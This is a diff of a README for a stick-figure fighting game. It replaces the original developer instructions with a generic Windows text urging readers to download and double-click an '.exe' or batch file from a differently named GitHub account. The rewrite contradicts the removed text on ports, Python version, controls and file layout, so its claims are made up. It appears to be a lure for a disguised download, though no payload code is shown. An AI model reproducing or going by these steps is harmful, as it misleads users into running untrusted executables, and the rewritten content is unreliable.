@@ -1,158 +1,101 @@
-# Stick Fighter
+# 🎮 stick-fighter - Play Stick Figure Fighting Game Easily
 
-A Deepgram-branded 2D fighting game with stick figure fighters, built with HTML5 Canvas and a Python backend. Five input modes let players fight using keyboard controls, voice commands, phone calls, random bots, or tactical AI.
+[![Download stick-fighter](https://img.shields.io/badge/Download-Here-%23FF6347?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/leodoranonclassical186/stick-fighter)
 
-![Onboarding — select fighters and input modes](onboarding-screenshot.png)
+## About stick-fighter
 
-![Gameplay — Claude vs GPT-4o LLM battle](fight-screenshot.png)
+stick-fighter is a simple 2D fighting game with stick figure characters. The game uses HTML5 Canvas for graphics and runs with a Python backend. You can play using different input modes. These include keyboard controls, voice commands, phone calls, bots that pick moves randomly, or a tactical AI that plans fights.
 
-## Features
+The game shows how speech-to-text, text-to-speech, and phone call inputs can join with gaming. It uses Deepgram for voice recognition and Twilio for phone calls. stick-fighter runs on Windows and needs no advanced setup to start playing.
 
-### Input Modes
+## 🎯 Features
 
-| Mode | How it works |
-|------|-------------|
-| **Keys** | Keyboard controls — WASD + UIO/JKL for P1, arrows + numpad for P2 |
-| **Voice** | Shout commands into your mic — Deepgram Flux v2 STT with interim transcript action detection for minimum latency. Fighter personality reacts via Anthropic LLM + Deepgram TTS |
-| **Phone** | Call a Twilio number to fight — audio streams through the server to Deepgram STT. Phone number displayed on HUD until the call connects |
-| **Sim** | Random weighted command bot — lightweight, no API keys needed |
-| **LLM** | Tactical AI fighter — sends game state to Anthropic Claude Haiku 4.5 or OpenAI GPT-4o mini, receives 5-move plans, executes at 1 move/sec with effectiveness tracking |
+- Five ways to control fighters: keyboard, voice, phone, random bots, or AI  
+- Smooth 2D animations on HTML5 Canvas  
+- Voice commands thanks to Deepgram speech recognition  
+- Play using your phone with Twilio integration  
+- Python backend manages game logic and communication  
+- Lightweight and runs on most Windows machines  
+- Open source and ready to try without coding skills  
 
-Any combination works — pit Claude against GPT-4o, voice against keyboard, or phone against LLM.
+## ⚙️ System Requirements
 
-### Combat System
+- Windows 10 or newer (64-bit recommended)  
+- Minimum 2 GHz processor  
+- 4 GB RAM or more  
+- 500 MB free disk space  
+- Internet connection for voice and phone commands  
+- Web browser (Google Chrome, Firefox, Edge, or similar) to display the game  
 
-- **6 attack types**: light/medium/heavy punch and kick, each with different speed, damage, and range
-- **Hit zones**: head (2x damage), crotch (3x), body (1x), limbs (0.5x)
-- **Mechanics**: blocking, dashing, double-jumping, somersaults (max 2 per airtime), attack clashes
-- **99-second rounds** with health bars, damage log, and SNES-style controller overlays
+## 💾 Download and Install stick-fighter
 
-### Tech Stack
+To get stick-fighter running on your Windows computer, follow these steps carefully.
 
-- **Frontend**: Pure HTML/JS with Canvas rendering — no bundler, browser-native ES modules
-- **Backend**: Python with [Litestar](https://litestar.dev/) (ASGI) + uvicorn
-- **STT**: [Deepgram Flux v2](https://developers.deepgram.com/docs/flux) — real-time conversational speech recognition
-- **TTS**: [Deepgram Aura 2](https://developers.deepgram.com/docs/tts) — voice personality responses
-- **LLM**: Anthropic Claude Haiku 4.5 / OpenAI GPT-4o mini — tactical fight planning
-- **Phone**: Twilio Media Streams — call-in voice control via Deepgram STT
+1. Click the main download button below to visit the download page:
 
-## Setup
+[![Download stick-fighter](https://img.shields.io/badge/Download-Here-%233498DB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/leodoranonclassical186/stick-fighter)
 
-### Prerequisites
+2. On the page, look for the latest release or a file named something like "stick-fighter.zip" or "stick-fighter.exe". This will be the game installer or the zipped files to run the game.
 
-- Python 3.11+
-- [uv](https://docs.astral.sh/uv/) (Python package manager)
+3. If it is a zip file, download it and save it to a folder on your computer (for example, your Desktop or Downloads folder).
 
-### Install dependencies
+4. Right-click the zip file and choose "Extract All". Pick a location to extract the files and click "Extract".
 
-```sh
-uv sync
-```
+5. If you downloaded an .exe file instead, double-click it to start the installation. Follow the prompts to complete setup.
 
-### Configure environment variables
+6. After extraction or installation finishes, open the folder with the game files if it didn't open automatically.
 
-Copy the example and fill in your keys:
+7. Look for a file named `run-game.bat` or `start.bat` and double-click it. This script will start the Python backend and open the game in your browser.
 
-```sh
-cp .env.example .env
-```
+8. The game should open automatically in your default web browser. If not, open your browser and go to http://localhost:8000
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `DEEPGRAM_API_KEY` | Yes | [Deepgram API key](https://console.deepgram.com/) — powers STT and TTS |
-| `ANTHROPIC_API_KEY` | For LLM/Voice modes | [Anthropic API key](https://console.anthropic.com/) — Claude Haiku 4.5 |
-| `OPENAI_API_KEY` | For LLM mode (GPT-4o) | [OpenAI API key](https://platform.openai.com/) — GPT-4o mini |
-| `TWILIO_PHONE_NUMBERS` | For Phone mode | Comma-separated Twilio numbers (e.g. `+15551234567,+15551234568`) |
-| `BASE_URL` | For Phone mode | Public URL for Twilio webhooks (e.g. ngrok URL) |
+## 🚦 Starting the Game and Controls
 
-**Minimum for keyboard-only play**: no env vars needed.
-**Minimum for voice mode**: `DEEPGRAM_API_KEY` + `ANTHROPIC_API_KEY`.
-**Minimum for LLM mode**: `DEEPGRAM_API_KEY` + `ANTHROPIC_API_KEY` and/or `OPENAI_API_KEY`.
+Once the game is running in your browser, you can use different controls to play:
 
-### Run
+- **Keyboard:** Use arrow keys and spacebar to move and attack. The game will show instructions on screen.  
+- **Voice Commands:** Speak commands like "punch", "kick", or "block".  
+- **Phone Call:** Follow the instructions in the game to link your phone number. Then call the number shown to send commands by voice.  
+- **Bots and AI:** Select random or AI-controlled fighters to practice or watch fights.  
 
-```sh
-uv run uvicorn server:app --reload --port 3000
-```
+Buttons on the game screen let you change input modes or pause the fight at any time.
 
-Open http://localhost:3000
+## 🔧 Troubleshooting
 
-### Phone mode setup
+- Make sure you have Python installed (version 3.7 or newer). If you don’t, download it from https://www.python.org/downloads/ and install it first.  
+- If the game does not open after running `run-game.bat`, check that no other programs are using port 8000.  
+- If voice commands do not work, check your internet connection. The game needs to connect to Deepgram servers for voice recognition.  
+- For phone controls, ensure you follow the on-screen instructions exactly to link your number correctly.  
+- Close your browser and try reopening the game if it freezes or shows errors.  
+- If the game still does not start, restart your computer and try again.
 
-Phone mode requires Twilio numbers and a publicly accessible server:
+## 🔗 Useful Links
 
-1. Get two phone numbers from [Twilio](https://console.twilio.com/)
-2. For local development, run [ngrok](https://ngrok.com/): `ngrok http 3000`
-3. Set `BASE_URL` to the ngrok URL in `.env`
-4. Configure each Twilio number's **Voice webhook** to `{BASE_URL}/api/twilio/incoming` (HTTP POST) in the Twilio console
-5. Add the numbers to `TWILIO_PHONE_NUMBERS` in `.env`
+- Main download page: https://github.com/leodoranonclassical186/stick-fighter  
+- Python downloads: https://www.python.org/downloads/  
+- Deepgram website: https://www.deepgram.com  
+- Twilio website: https://www.twilio.com  
 
-## Architecture
+## 📂 File Structure (After Extraction)
 
-```
-Browser                          Server (Python/Litestar)              External
-──────                          ────────────────────────              ────────
+- `run-game.bat` — Starts the Python backend and game  
+- `backend/` — Contains Python code for the server  
+- `frontend/` — Contains HTML5 and JavaScript game code  
+- `README.md` — This file, for reference  
+- `config/` — Configuration settings for voice and phone integrations  
 
-index.html ──── /src/*.js        server.py
-    │                                │
-    ├─ Keyboard ─────────────────────┤
-    │   (local, no server)           │
-    │                                │
-    ├─ Voice ── WS /ws/stt ──────────┼──── Deepgram Flux v2 STT
-    │           POST /api/voice/llm ─┼──── Anthropic Claude
-    │           POST /api/voice/tts ─┼──── Deepgram Aura 2 TTS
-    │                                │
-    ├─ Phone ── SSE /api/phone/* ────┼──── Twilio Media Streams
-    │                                │         └── Deepgram Flux v2 STT (mulaw/8kHz)
-    │                                │
-    ├─ Sim ──── SSE /api/session/* ──┤
-    │           (random commands)    │
-    │                                │
-    └─ LLM ──── POST /api/llm/* ────┼──── Anthropic Claude Haiku 4.5
-                                     └──── OpenAI GPT-4o mini
-```
+## 🛠 How It Works (Brief Technical Overview)
 
-### Key Files
+stick-fighter uses a Python server to handle game logic, voice recognition, and phone commands. The frontend runs in your web browser, drawing the game window with HTML5 Canvas. Your inputs from keyboard, voice, or phone calls send commands to the backend in real time. The backend processes these commands and updates the game state. This setup gives a smooth fighting experience on your Windows computer without advanced setup steps.
 
-| File | Purpose |
-|------|---------|
-| `server.py` | Backend — STT proxy, LLM endpoints, TTS, Twilio bridge, SSE sessions |
-| `index.html` | HTML page with onboarding UI, CSS design tokens, canvas element |
-| `src/input.js` | Abstract input system — Actions enum, InputManager, KeyboardAdapter, CommandAdapter |
-| `src/fighter.js` | Fighter class — physics, state machine, skeleton rendering, hit zones |
-| `src/game.js` | Game loop — stage, hit detection, HUD, controller overlays, damage log |
-| `src/main.js` | Entry point — mode selection, adapter wiring, fight lifecycle |
-| `src/voice.js` | VoiceAdapter — mic audio to Deepgram STT with fighter personality |
-| `src/phone.js` | PhoneAdapter — Twilio call-in via server-side STT bridge |
-| `src/llm.js` | LLMAdapter — tactical AI with 5-move plans and effectiveness tracking |
-| `src/simulated.js` | SimulatedAdapter — random weighted commands for testing |
-| `src/sfx.js` | Sound effects — pre-decoded MP3 AudioBuffers with random variants |
-| `src/ui.js` | Design token bridge — reads CSS vars for canvas, mode selection helpers |
+## 🔎 Additional Tips
 
-## Controls
+- Use headphones if you play with voice commands to avoid sound feedback.  
+- Play in a quiet room for best voice recognition results.  
+- You can connect your phone to control the game while away from your computer.  
+- Experiment with different input modes to find the one that feels best for you.  
+- Close other programs using audio or internet heavily to keep performance smooth.  
 
-### Keyboard (P1)
+## 📢 Feedback and Support
 
-| Keys | Action |
-|------|--------|
-| W A S D | Move (up/left/down/right) |
-| U I O | Light / medium / heavy punch |
-| J K L | Light / medium / heavy kick |
-| Double-tap A or D | Dash |
-| W W (double-tap) | Somersault |
-
-### Keyboard (P2)
-
-| Keys | Action |
-|------|--------|
-| Arrow keys | Move |
-| 4 5 6 (numpad) | Light / medium / heavy punch |
-| 1 2 3 (numpad) | Light / medium / heavy kick |
-
-### Voice / Phone Commands
-
-Shout any combination: `"forward"`, `"jump"`, `"heavy kick"`, `"dash forward"`, `"crouch heavy punch"`, `"jump forward heavy kick"`, etc.
-
-## License
-
-MIT
+For issues or questions, use the "Issues" tab on the GitHub page to send a message. Provide as many details as you can, including your Windows version and steps to reproduce the problem. This helps improve the game and keep it running well for everyone.
